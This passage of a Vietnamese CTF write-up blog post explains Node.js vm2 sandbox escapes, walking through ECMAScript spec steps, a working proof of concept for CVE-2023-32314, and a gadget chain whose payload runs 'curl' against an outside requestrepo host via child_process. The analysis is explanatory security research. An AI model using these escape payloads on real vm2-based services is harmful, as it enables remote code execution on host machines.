<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="nx">code</span><span class="p">));</span>
</pre></td></tr></tbody></table></code></div></div>

<p><strong>Phân tích</strong></p>

<p>Một trạng thái bất thường của máy chính trong ngữ cảnh bất đồng bộ (Promise) sẽ có thể leak object của máy chính ra ngoài, như ở trên ta có thể dựa vào đây để thoát khỏi sandbox và RCE</p>

<p>Ban đầu khi mới vào thì <code class="language-plaintext highlighter-rouge">Promise.prototype.then</code> đã bị viết đè bằng cách dùng Proxy để khử các tham số mà người dùng cung cấp cho function <code class="language-plaintext highlighter-rouge">onRejected</code></p>

<p><a href="/assets/escapevm/4.png" class="popup img-link  shimmer"><img src="/assets/escapevm/4.png" alt="alt text" loading="lazy"></a></p>

<p>Đọc document của ES2022 của <code class="language-plaintext highlighter-rouge">Promise.prototype.then</code> có chỉ một đoạn liên quan đến <code class="language-plaintext highlighter-rouge">@@species</code> ở đây <a href="https://tc39.es/ecma262/2022/multipage/control-abstraction-objects.html#sec-promise.prototype.then">link</a></p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>When the then method is called with arguments onFulfilled and onRejected, the following steps are taken:

1. Let promise be the this value.
2. If IsPromise(promise) is false, throw a TypeError exception.
**3. Let C be ? SpeciesConstructor(promise, %Promise%).**
**4. Let resultCapability be ? NewPromiseCapability(C).**
**5. Return PerformPromiseThen(promise, onFulfilled, onRejected, resultCapability).**
</pre></td></tr></tbody></table></code></div></div>

<p>Có 3 đoạn cần chú ý ở trên đó là <code class="language-plaintext highlighter-rouge">SpeciesConstructor</code>, <code class="language-plaintext highlighter-rouge">NewPromiseCapability</code> và <code class="language-plaintext highlighter-rouge">PerformPromiseThen</code></p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>1. Let C be ? Get(O, "constructor").
2. If C is undefined, return defaultConstructor.
3. If Type(C) is not Object, throw a TypeError exception.
4. Let S be ? Get(C, @@species).
5. If S is either undefined or null, return defaultConstructor.
6. If IsConstructor(S) is true, return S.
7. Throw a TypeError exception.
</pre></td></tr></tbody></table></code></div></div>

<p>Đây là pesudo code của <code class="language-plaintext highlighter-rouge">SpeciesConstructor</code> cả đoạn trên tóm lại là nó sẽ return object <code class="language-plaintext highlighter-rouge">@@species</code></p>

<p>và tiếp theo là  <code class="language-plaintext highlighter-rouge">NewPromiseCapability</code></p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre>1. If IsConstructor(C) is false, throw a TypeError exception.
2. NOTE: C is assumed to be a constructor function that supports the parameter conventions of the Promise constructor (see 27.2.3.1).
3. Let promiseCapability be the PromiseCapability Record { [[Promise]]: undefined, [[Resolve]]: undefined, [[Reject]]: undefined }.
4. Let executorClosure be a new Abstract Closure with parameters (resolve, reject) that captures promiseCapability and performs the following steps when called:
a. If promiseCapability.[[Resolve]] is not undefined, throw a TypeError exception.
b. If promiseCapability.[[Reject]] is not undefined, throw a TypeError exception.
c. Set promiseCapability.[[Resolve]] to resolve.
d. Set promiseCapability.[[Reject]] to reject.
e. Return undefined.
5. Let executor be CreateBuiltinFunction(executorClosure, 2, "", « »).
6. Let promise be ? Construct(C, « executor »).
7. If IsCallable(promiseCapability.[[Resolve]]) is false, throw a TypeError exception.
8. If IsCallable(promiseCapability.[[Reject]]) is false, throw a TypeError exception.
9. Set promiseCapability.[[Promise]] to promise.
10. Return promiseCapability.
</pre></td></tr></tbody></table></code></div></div>

<p>Cả đoạn trên ta có thể rút gọn bỏ đi các phần không liên quan đến CVE là như sau</p>

<ul>
  <li>NewPromiseCapability cho phép tạo một constructor và gán nó bằng giá trị của <code class="language-plaintext highlighter-rouge">@@sepcies</code>, sau đó sử dụng <code class="language-plaintext highlighter-rouge">executor</code> là một closure (đại loại là nó có thể access được các biến từ phạm vi bên ngoài nó) nhận 2 xử lý là <code class="language-plaintext highlighter-rouge">resolve</code> và <code class="language-plaintext highlighter-rouge">reject</code> và gán mỗi giá trị vào <code class="language-plaintext highlighter-rouge">resultCapability.[[Resolve]]</code> và <code class="language-plaintext highlighter-rouge">resultCapability.[[Reject]]</code>.</li>
</ul>

<p>Tiếp tục ở đoạn <code class="language-plaintext highlighter-rouge">PerformPromiseThen</code>, nó có định nghĩa <code class="language-plaintext highlighter-rouge">promise.[[PromiseState]]</code> lúc bị <code class="language-plaintext highlighter-rouge">rejected</code></p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>8. Let rejectReaction be the PromiseReaction { [[Capability]]: resultCapability, [[Type]]: Reject, [[Handler]]: onRejectedJobCallback }.
9. If promise.[[PromiseState]] is pending, then ...
10. Else if promise.[[PromiseState]] is fulfilled, then ...
11. Else,
    a. Assert: The value of promise.[[PromiseState]] is rejected.
    b. Let reason be promise.[[PromiseResult]].
    c. If promise.[[PromiseIsHandled]] is false, perform HostPromiseRejectionTracker(promise, "handle").
    d. Let rejectJob be NewPromiseReactionJob(rejectReaction, reason).
    e. Perform HostEnqueuePromiseJob(rejectJob.[[Job]], rejectJob.[[Realm]]).
</pre></td></tr></tbody></table></code></div></div>
<p>Trong này có 1 đoạn quan trọng là <code class="language-plaintext highlighter-rouge">rejectJob = NewPromiseReactionJob(rejectReaction, reason)</code> vì nó sẽ là điều kiện để chúng ta thực hiện RCE</p>

<p>Tiếp tục đọc mã giả của <code class="language-plaintext highlighter-rouge">NewPromiseReactionJob</code></p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre>1. Let job be a new Job Abstract Closure with no parameters that captures reaction and argument and performs the following steps when called:
    a. Let promiseCapability be reaction.[[Capability]].
    b. Let type be reaction.[[Type]].
    c. Let handler be reaction.[[Handler]].
    d. **If handler is empty, then**
        i. If type is Fulfill, let handlerResult be NormalCompletion(argument).
        ii. Else,
            1. Assert: type is Reject.
            2. **Let handlerResult be ThrowCompletion(argument).**
    e. Else, let handlerResult be Completion(HostCallJobCallback(handler, undefined, « argument »)).
    f. If promiseCapability is undefined, then
        i. Assert: handlerResult is not an abrupt completion.
        ii. Return empty.
    g. Assert: promiseCapability is a PromiseCapability Record.
    h. **If handlerResult is an abrupt completion, then**
        i. **Return ? Call(promiseCapability.[[Reject]], undefined, « handlerResult.[[Value]] »).**
    i. Else,
        i. Return ? Call(promiseCapability.[[Resolve]], undefined, « handlerResult.[[Value]] »).
</pre></td></tr></tbody></table></code></div></div>

<p>Ta sẽ chú ý đến các đoạn d.ii, h.i</p>

<p>Nếu <code class="language-plaintext highlighter-rouge">handler</code> không là rỗng và type là Reject (nghĩa là promise đang bị từ chối), thì handlerResult sẽ được gán là một hoàn thành kiểu ném lỗi của argument. Điều này thể hiện việc promise đã bị từ chối.</p>

<p>Sau đó là</p>

<p>Nếu <code class="language-plaintext highlighter-rouge">handlerResult</code> là một hoàn thành đột ngột(abrupt completion), thì</p>

<p>Trả về ? Call(promiseCapability.[[Reject]], undefined, « handlerResult.[[Value]] »).</p>

<p>Nếu handlerResult là một hoàn thành đột ngột (nghĩa là xảy ra lỗi trong quá trình xử lý), thì cần phải gọi hàm Reject của promiseCapability với giá trị lỗi từ handlerResult.</p>

<p>Vậy từ tất cả thứ trên, tóm lại ta có thể escape sandbox như sau:</p>

<ol>
  <li>Gọi một function bất đồng bộ để nó throw ra trạng thái bất thường ở máy chính, trả về rejected Promise object</li>
  <li>Ta sẽ ghi đè constructor của Promise object với thuộc tính của @@species (Symbol.species) với giá trị là executor thừa hưởng từ lớp cha và gọi với 2 hàm xử lý <code class="language-plaintext highlighter-rouge">resolve</code> và <code class="language-plaintext highlighter-rouge">reject</code>(ta bỏ payload vào đây)</li>
  <li>Gọi <code class="language-plaintext highlighter-rouge">then</code> để trigger <code class="language-plaintext highlighter-rouge">Call(promiseCapability.[[Reject]], undefined, « handlerResult.[[Value]] »).</code> và ez RCE</li>
</ol>

<h3 id="cve-2023-32314"><span class="me-2">CVE-2023-32314</span><a href="#cve-2023-32314" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>A sandbox escape vulnerability exists in vm2 for versions up to 3.9.17. It abuses an unexpected creation of a host object based on the specification of Proxy, and allows RCE via Function in the host context.
</pre></td></tr></tbody></table></code></div></div>

<p>POC</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="p">{</span> <span class="nx">VM</span> <span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">vm2</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">VM</span><span class="p">();</span>

<span class="kd">const</span> <span class="nx">code</span> <span class="o">=</span> <span class="s2">`
  const err = new Error();
  err.name = {
    toString: new Proxy(() =&gt; "", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor("return process")();
        throw process.mainModule.require("child_process").execSync("echo hacked").toString();
      },
    }),
  };
  try {
    err.stack;
  } catch (stdout) {
    stdout;
  }
`</span><span class="p">;</span>

<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="nx">code</span><span class="p">));</span>
</pre></td></tr></tbody></table></code></div></div>

<p><strong>Phân tích</strong></p>

<p>CVE này nhìn cũng khá giống CVE trên kia nhưng nó đơn giản hơn</p>

<p>Khi <code class="language-plaintext highlighter-rouge">err.name.toString</code> được gọi ở  <code class="language-plaintext highlighter-rouge">ErrorPrototypeToString</code> trong <code class="language-plaintext highlighter-rouge">prepareStackTrace</code> thì nó lại là trong ngữ cảnh của máy chính</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">error</code> của  <code class="language-plaintext highlighter-rouge">prepareStackTrace</code> không được xử lý qua cơ chế proxy của <code class="language-plaintext highlighter-rouge">vm2</code> nên nó được gọi thẳng bởi V8</li>
</ul>

<p>Và còn 1 điều nữa là ở Proxy khi được gọi đến nó có 1 đoạn mã giả như sau</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>7. Let argArray be CreateArrayFromList(argumentsList).
8. Return ? Call(trap, handler, « target, thisArgument, argArray »).
</pre></td></tr></tbody></table></code></div></div>

<p>Khi <code class="language-plaintext highlighter-rouge">err.name.toString</code> được gọi thì <code class="language-plaintext highlighter-rouge">CreateArrayFromList()</code> sẽ tạo ra argArray ở ngữ cảnh của máy chính sau đó được truyền vào <code class="language-plaintext highlighter-rouge">apply(target, thiz, args)</code>. Vậy ta có thể tiếp cận được <code class="language-plaintext highlighter-rouge">Function</code> ở máy chính. Từ đó RCE</p>

<h3 id="gadgets-chaining"><span class="me-2">Gadgets chaining</span><a href="#gadgets-chaining" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Gadgets chaining là một kỹ thuật sử dụng các gadgets (một chuỗi các lệnh nhỏ) để thực hiện kết nối chúng lại với nhau. Ví dụ như việc sử dụng các gadgets để thực hiện một hành động như RCE</p>

<p>Note: Cách này mình đã đọc được từ writeup của các giải amstrong2024 và TSG2023 và tham khảo của anh shin24 link mình sẽ đính kèm bên dưới</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="nx">toString</span><span class="p">.</span><span class="kd">constructor</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">toString</span><span class="o">=</span><span class="nx">toString</span><span class="p">.</span><span class="kd">constructor</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">call</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">a</span><span class="o">=</span><span class="p">[</span><span class="dl">"</span><span class="s2">process.mainModule.require('child_process').execSync('curl http://yh9wz5br.requestrepo.com')</span><span class="dl">"</span><span class="p">];</span>
<span class="nx">a</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="dl">"</span><span class="s2">x</span><span class="dl">"</span><span class="p">;</span>
<span class="nx">b</span><span class="o">=</span><span class="p">{};</span>
<span class="nx">b</span><span class="p">[</span><span class="nb">Symbol</span><span class="p">.</span><span class="nx">hasInstance</span><span class="p">]</span><span class="o">=</span><span class="nx">a</span><span class="p">.</span><span class="nx">sort</span><span class="p">;</span>
<span class="nx">b</span><span class="p">[</span><span class="dl">"</span><span class="s2">__proto__</span><span class="dl">"</span><span class="p">]</span><span class="o">=</span><span class="nx">a</span><span class="p">;</span>
<span class="nx">toString</span><span class="p">.</span><span class="kd">constructor</span> <span class="k">instanceof</span> <span class="nx">b</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Giải thích sơ qua về payload này</p>

<ul>
  <li>
    <p>Đầu tiên chúng ta sẽ gọi đến function <code class="language-plaintext highlighter-rouge">toString</code> và gán giá trị của function <code class="language-plaintext highlighter-rouge">call</code> cho nó</p>
  </li>
  <li>
    <p>Tiếp theo ta tạo một mảng a với giá trị đầu tiên là payload mà ta muốn execute (payload này sẽ được thực thi trong anonymous function)</p>
  </li>
  <li>
    <p>Tiếp theo ta gán giá trị <code class="language-plaintext highlighter-rouge">'x'</code> cho <code class="language-plaintext highlighter-rouge">a[1]</code> (sẽ giải thích ở bên dưới vì sao có phần này)</p>
  </li>
  <li>
    <p>Sau đó tạo một object b với key là <code class="language-plaintext highlighter-rouge">Symbol.hasInstance</code> và value là <code class="language-plaintext highlighter-rouge">a.sort</code></p>
  </li>
  <li>
    <p>Sau đó set <code class="language-plaintext highlighter-rouge">__proto__</code> của b là a</p>
  </li>
  <li>
    <p>Cuối cùng là kiểm tra xem toString.constructor có phải là instance của b (thật ra đoạn này không hẳn là kiểm tra mà là điều kiện để RCE)</p>
  </li>
</ul>

<p>Trước khi đi vào phần phân tích sâu hơn, mình sẽ giải thích về cách của instanceof hoạt động</p>

<p>Syntax</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nx">object</span> <span class="k">instanceof</span> <span class="kd">constructor</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Toán tử <code class="language-plaintext highlighter-rouge">instanceof</code> là toán tử dùng để kiểm tra xem một đối tượng có thuộc lớp nào đó hay không</p>

<p>Ví dụ đơn giản như sau</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="kd">class</span> <span class="nc">BOX</span> <span class="p">{}</span>
<span class="kd">let</span> <span class="nx">DI</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BOX</span><span class="p">();</span>

<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">DI</span> <span class="k">instanceof</span> <span class="nx">BOX</span><span class="p">);</span> <span class="c1">//true</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Ngoài ra nếu <code class="language-plaintext highlighter-rouge">constructor</code> (phần bên phải của <code class="language-plaintext highlighter-rouge">instanceof</code>) có phương thức <code class="language-plaintext highlighter-rouge">Symbol.hasInstance</code> thì nó sẽ được ưu tiên gọi, với <code class="language-plaintext highlighter-rouge">object</code> (phần bên trái của <code class="language-plaintext highlighter-rouge">instanceof</code>) là tham số truyền vào còn bên phải là <code class="language-plaintext highlighter-rouge">this</code> sau đó dùng kết quả để trả về kết quả của <code class="language-plaintext highlighter-rouge">instanceof</code></p>

<p>Ví dụ 1:</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="nx">BOX</span> <span class="o">=</span> <span class="p">{[</span><span class="nb">Symbol</span><span class="p">.</span><span class="nx">hasInstance</span><span class="p">]:</span> <span class="p">(</span><span class="nx">dib</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="c1">// console.log(dib)</span>
    <span class="k">return</span> <span class="nx">dib</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">dib</span><span class="dl">'</span>
<span class="p">}};</span>

<span class="nx">DI</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">dib</span><span class="dl">'</span>

<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">DI</span> <span class="k">instanceof</span> <span class="nx">BOX</span><span class="p">);</span> <span class="c1">//true</span>

</pre></td></tr></tbody></table></code></div></div>

<p>Ví dụ 2:</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="nx">a</span> <span class="o">=</span> <span class="p">[</span><span class="dl">'</span><span class="s1">1</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">0</span><span class="dl">'</span><span class="p">]</span>
<span class="nx">a</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">[</span><span class="dl">'</span><span class="s1">loG</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">triggered</span><span class="dl">"</span><span class="p">)</span>
<span class="p">}</span>
<span class="nx">BOX</span> <span class="o">=</span> <span class="p">{[</span><span class="nb">Symbol</span><span class="p">.</span><span class="nx">hasInstance</span><span class="p">]:</span> <span class="nx">a</span><span class="p">.</span><span class="nx">loG</span><span class="p">};</span>

<span class="nx">DI</span> <span class="o">=</span> <span class="nb">Function</span>

<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">DI</span> <span class="k">instanceof</span> <span class="nx">BOX</span><span class="p">);</span> <span class="c1">// "triggered"</span>
<span class="c1">// console.log(a)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Đến phần chính, đi sâu vào giải thích vì sao nó hoạt động</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nx">toString</span><span class="p">.</span><span class="kd">constructor</span> <span class="k">instanceof</span> <span class="nx">b</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Khi câu lệnh này được thực thi thì:</p>

<ul>
  <li>
    <p>Khi <code class="language-plaintext highlighter-rouge">instanceof</code> được sử dụng thì nó sẽ tìm kiếm xem b có thuộc tính <code class="language-plaintext highlighter-rouge">Symbol.hasInstance</code> không? Nếu có thì sẽ thực thi gọi tới <code class="language-plaintext highlighter-rouge">a.sort</code> là <code class="language-plaintext highlighter-rouge">this</code> và <code class="language-plaintext highlighter-rouge">toString.constructor</code> (AKA <code class="language-plaintext highlighter-rouge">Function</code>) là tham số truyền vào</p>
  </li>
  <li>
    <p>Khi <code class="language-plaintext highlighter-rouge">a.sort</code>(function sort) được gọi đến thì bình thường  thì nó sẽ cố gắng chuyển tất cả các phần tử trong mảng thành string bằng hàm <code class="language-plaintext highlighter-rouge">toString()</code> rồi so sánh bằng <code class="language-plaintext highlighter-rouge">function</code> truyền vào. Điều này vô tình trigger hàm <code class="language-plaintext highlighter-rouge">call()</code> chúng ta đã đổi ở lúc đầu và bây giờ cả <code class="language-plaintext highlighter-rouge">array</code> sẽ trở thành <code class="language-plaintext highlighter-rouge">parameter</code> của <code class="language-plaintext highlighter-rouge">new Function</code></p>
  </li>
  <li>
    <p>Nói thêm ở phần này về lý do phải set <code class="language-plaintext highlighter-rouge">b[__proto__]=a</code> là vì <code class="language-plaintext highlighter-rouge">sort</code> là <code class="language-plaintext highlighter-rouge">function</code> của <code class="language-plaintext highlighter-rouge">array</code> nên chúng ta phải đổi <code class="language-plaintext highlighter-rouge">prototype</code> của nó thành <code class="language-plaintext highlighter-rouge">array</code> thì sort mới có thể được thực thi và hơn hết khi đó <code class="language-plaintext highlighter-rouge">sort</code> sẽ được thực thi trên <code class="language-plaintext highlighter-rouge">b</code>, <code class="language-plaintext highlighter-rouge">b</code> lúc này là một <code class="language-plaintext highlighter-rouge">object</code> nên <code class="language-plaintext highlighter-rouge">sort</code> sẽ cố gắng tìm kiếm <code class="language-plaintext highlighter-rouge">array</code> trong <code class="language-plaintext highlighter-rouge">object</code> này bằng cách tìm kiếm trong <code class="language-plaintext highlighter-rouge">prototype</code> của nó khi đó nó sẽ tìm được 1 <code class="language-plaintext highlighter-rouge">array</code> trong vì ta set <code class="language-plaintext highlighter-rouge">prototype</code> của <code class="language-plaintext highlighter-rouge">b</code> là <code class="language-plaintext highlighter-rouge">a</code></p>
  </li>
  <li>
    <p>Giá trị return của <code class="language-plaintext highlighter-rouge">new Function</code> này sẽ là một anonymous với <code class="language-plaintext highlighter-rouge">a[0]</code> là function và <code class="language-plaintext highlighter-rouge">a[1]</code> là parameter</p>
  </li>
</ul>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="p">(</span><span class="kd">function</span> <span class="nf">anonymous</span><span class="p">(</span><span class="nx">x</span>
<span class="p">)</span> <span class="p">{</span>
<span class="nx">process</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">child_process</span><span class="dl">'</span><span class="p">).</span><span class="nf">execSync</span><span class="p">(</span><span class="dl">'</span><span class="s1">curl http://yh9wz5br.requestrepo.com</span><span class="dl">'</span><span class="p">)</span>
<span class="p">})</span>
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>Để nói thêm một chút nữa thì flow của chương trình sẽ như sau trigger <code class="language-plaintext highlighter-rouge">sort</code> -&gt; <code class="language-plaintext highlighter-rouge">sort</code> nhận <code class="language-plaintext highlighter-rouge">Function</code> làm tham số -&gt; <code class="language-plaintext highlighter-rouge">Function</code> là hàm được sử dụng để ‘so sánh’ các phần tử bên trong mảng -&gt; Mỗi phần từ được chuyển qua string(trigger <code class="language-plaintext highlighter-rouge">call</code> function) -&gt; Trả về một anonymouse function -&gt; Cuối cùng giá trị sau khi ‘so sánh’ sẽ được trả về dưới dạng string (trigger <code class="language-plaintext highlighter-rouge">call</code> function)</li>
</ul>

<p>Đây là code mô phỏng lại quá trình sort</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="nx">toString</span><span class="p">.</span><span class="kd">constructor</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">toString</span><span class="o">=</span><span class="nb">Function</span><span class="p">.</span><span class="nx">call</span><span class="p">;</span>

<span class="nc">Function</span><span class="p">(</span><span class="nx">a</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nf">toString</span><span class="p">(),</span><span class="nx">a</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">toString</span><span class="p">()).</span><span class="nf">toString</span><span class="p">();</span>
</pre></td></tr></tbody></table></code></div></div>


  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/ctf-writeup/">CTF Writeup</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/nodejs/"
            class="post-tag no-text-decoration"
          >NodeJS</a>
        
          <a
            href="/tags/esacpe-vm/"
            class="post-tag no-text-decoration"
          >Esacpe VM</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=NodeJS%20escape%20VM%20and%20some%20gadgets%20chaining%20in%20NodeJS%20-%20Yuu's%20blog&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FNodejs-escapeVM%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=NodeJS%20escape%20VM%20and%20some%20gadgets%20chaining%20in%20NodeJS%20-%20Yuu's%20blog&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FNodejs-escapeVM%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FNodejs-escapeVM%2F&text=NodeJS%20escape%20VM%20and%20some%20gadgets%20chaining%20in%20NodeJS%20-%20Yuu's%20blog" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
